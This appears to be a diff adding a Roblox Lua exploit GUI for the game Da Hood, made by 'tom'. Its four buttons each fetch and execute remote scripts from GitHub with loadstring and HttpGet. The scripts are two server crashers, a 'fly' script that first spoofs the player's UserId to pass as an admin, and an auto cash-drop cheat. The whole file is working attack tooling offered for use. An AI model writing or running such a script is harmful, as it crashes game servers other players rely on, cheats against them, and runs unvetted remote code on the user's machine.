@@ -1,0 +1,79 @@
+--made by tomW--
+
+local ScreenGui = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local label = Instance.new("TextLabel")
+local TextButton = Instance.new("TextButton")
+local TextButton_2 = Instance.new("TextButton")
+local TextButton_3 = Instance.new("TextButton")
+local TextButton_4 = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+
+main.Name = "main"
+main.Parent = ScreenGui
+main.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
+main.Position = UDim2.new(0.261923999, 0, 0.167420864, 0)
+main.Size = UDim2.new(0, 608, 0, 377)
+main.Active = true
+main.Draggable = true
+
+label.Name = "label"
+label.Parent = main
+label.BackgroundColor3 = Color3.fromRGB(1, 98, 255)
+label.Size = UDim2.new(0, 608, 0, 59)
+label.Font = Enum.Font.SourceSans
+label.Text = "da hood gui, made by tom"
+label.TextColor3 = Color3.fromRGB(0, 0, 0)
+label.TextSize = 14.000
+
+TextButton.Parent = main
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 26, 79)
+TextButton.Position = UDim2.new(0, 0, 0.156498671, 0)
+TextButton.Size = UDim2.new(0, 169, 0, 52)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "swag crash"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextSize = 14.000
+TextButton.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+end)
+
+TextButton_2.Parent = main
+TextButton_2.BackgroundColor3 = Color3.fromRGB(85, 170, 0)
+TextButton_2.Position = UDim2.new(0, 0, 0.294429719, 0)
+TextButton_2.Size = UDim2.new(0, 255, 0, 50)
+TextButton_2.Font = Enum.Font.SourceSans
+TextButton_2.Text = "encrypt crash"
+TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_2.TextSize = 14.000
+TextButton_2.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/remorseW/encryptW/main/CustomEncryptCrasher.lua'))()
+end)
+
+TextButton_3.Parent = main
+TextButton_3.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
+TextButton_3.Position = UDim2.new(0.277960539, 0, 0.161803707, 0)
+TextButton_3.Size = UDim2.new(0, 239, 0, 50)
+TextButton_3.Font = Enum.Font.SourceSans
+TextButton_3.Text = "fly"
+TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_3.TextSize = 14.000
+TextButton_3.MouseButton1Down:connect(function()
+    game.Players.LocalPlayer.UserId = 2607519759
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/22kristina/swag/main/admin_fly'))()
+end)
+
+TextButton_4.Parent = main
+TextButton_4.BackgroundColor3 = Color3.fromRGB(85, 0, 0)
+TextButton_4.Position = UDim2.new(0.671052635, 0, 0.161803707, 0)
+TextButton_4.Size = UDim2.new(0, 200, 0, 50)
+TextButton_4.Font = Enum.Font.SourceSans
+TextButton_4.Text = "auto drop"
+TextButton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_4.TextSize = 14.000
+TextButton_4.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(("https://raw.githubusercontent.com/Raycodex/Exploiting/main/Roblox/Da%20Hood%20Auto%20Cash%20Drop"), true))()
+end)
